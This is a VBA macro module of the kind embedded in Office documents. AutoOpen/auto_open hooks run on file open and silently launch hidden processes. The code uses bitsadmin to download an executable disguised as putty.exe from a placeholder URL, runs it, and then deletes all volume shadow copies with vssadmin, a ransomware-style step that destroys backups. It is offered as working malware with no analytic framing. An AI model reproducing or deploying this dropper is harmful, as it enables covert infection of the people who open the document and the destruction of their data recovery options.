
Option Explicit
#If Win64 Then
    Private Declare PtrSafe Function GetCurrentDirectory Lib "KERNEL32" Alias "GetCurrentDirectory" (ByVal nBufferLength As Long, ByVal lpFilename As String) As Long
    Private Declare PtrSafe Function WaitForSingleObject Lib "KERNEL32" (ByVal hHandle As Long, ByVal dwMilliSeconds As Long) As Long

    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetCurrentDirectory Lib "KERNEL32" Alias "GetCurrentDirectoryA" (ByVal nBufferLength As Long, ByVal lpFilename As String) As Long
   
    Private Declare Function WaitForSingleObject Lib "KERNEL32" (ByVal hHandle As Long, ByVal dwMilliSeconds As Long) As Long
#End If
Private Type STARTUPINFO
    cb As Long                  'DWORD   cb;
    lpReserved As String        'LPSTR   lpReserved;
    lpDesktop As String         'LPSTR   lpDesktop;
    lpTitle As String           'LPSTR   lpTitle;
    dwX As Long                 'DWORD   dwX;
    dwY As Long                 'DWORD   dwY;
    dwXSize As Long             'DWORD   dwXSize;
    dwYSize As Long             'DWORD   dwYSize;
    dwXCountChars As Long       'DWORD   dwXCountChars;
    dwYCountChars As Long       'DWORD   dwYCountChars;
    dwFillAttribute As Long     'DWORD   dwFillAttribute;
    dwFlags As Long             'DWORD   dwFlags;
    wShowWindow As Integer      'WORD    wShowWindow;
    cbReserved2 As Integer      'WORD    cbReserved2;
    lpReserved2 As Long      'LPBYTE  lpReserved2;
    hStdInput As Long        'HANDLE  hStdInput;
    hStdOutput As Long       'HANDLE  hStdOutput;
    hStdError As Long        'HANDLE  hStdError;
End Type
Private Type PROCESS_INFORMATION
    hProcess As Long     'HANDLE hProcess;
    hThread As Long      'HANDLE hThread;
    dwProcessId As Long     'DWORD dwProcessId;
    dwThreadId As Long      'DWORD dwThreadId;
End Type
Private Const INFINITE = &HFFFFFFFF
Private Const CREATE_NO_WINDOW = &H8000000
Private Const MAX_PATH = 260
Public Sub RunThatShit()
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    Dim lCreateProcess As Long
    Dim l2CreateProcess As Long
    Dim Ret As Long
    
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetCurrentDirectory(MAX_PATH, strCurrentFilePath)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    ' Create new process in suspended state
    lCreateProcess = CreateProcess(strNull, "bitsadmin /transfer myDownloadJOb23 urlhere " + strCurrentFilePath + "\\putty.exe", 0&, 0&, False, CREATE_NO_WINDOW, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Exit Sub
    Else
    Ret = WaitForSingleObject(structProcessInformation.hProcess, INFINITE)
    l2CreateProcess = CreateProcess(strNull, strCurrentFilePath + "\\putty.exe", 0&, 0&, False, CREATE_NO_WINDOW, 0&, strNull, structStartupInfo, structProcessInformation)
    
    Ret = WaitForSingleObject(structProcessInformation.hProcess, INFINITE)
    
    l2CreateProcess = CreateProcess(strNull, "vssadmin delete shadows /all /quiet", 0&, 0&, False, CREATE_NO_WINDOW, 0&, strNull, structStartupInfo, structProcessInformation)
    
    End If
End Sub
Sub auto_open()
'
' auto_open Macro
'
'
Call RunThatShit
End Sub
Sub AutoOpen()
'
' AutoOpen Macro
'
'
Call RunThatShit
End Sub

